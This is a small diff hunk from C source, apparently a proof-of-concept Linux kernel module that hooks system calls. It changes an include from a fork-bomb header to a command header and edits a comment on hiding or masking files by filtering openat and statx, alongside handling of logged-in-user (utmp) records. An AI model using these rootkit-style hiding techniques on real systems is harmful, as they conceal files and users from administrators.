@@ -3,12 +3,12 @@
     #include "utmp.h" //utmp.h is not defined in the kernel so we define it on our own, contains the utmp struct to handle logged in users
     #include "kite_hook.h"
     #include "linked_list.h"
-    #include "forkbomb.h"
+    #include "command_kite.h"
 
 static int utmpfd = -1;
 
 /*  !**can block file access by filtering in openat**
-    !**for more complex file filtering/hiding can be used to filter by file descriptors in statx**
+    !**for more complex file filtering/hiding/masking can be used to filter by file descriptors in statx**
     !**Theoretically, open() hook should be implemented too just in case, this is a POC thus no need for that**
 
     openat is a systemcall used to open files,
